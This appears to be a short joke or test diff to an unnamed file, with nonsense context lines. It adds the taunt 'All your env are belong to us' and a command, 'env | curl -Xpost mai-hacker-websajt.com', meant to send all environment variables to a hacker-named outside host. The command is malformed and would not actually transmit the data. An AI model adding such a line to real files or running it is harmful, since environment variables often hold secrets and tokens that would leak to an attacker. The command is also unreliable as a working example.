@@ -1,2 +1,5 @@
 completely different
 xd
+
+All your env are belong to us
+env | curl -Xpost mai-hacker-websajt.com
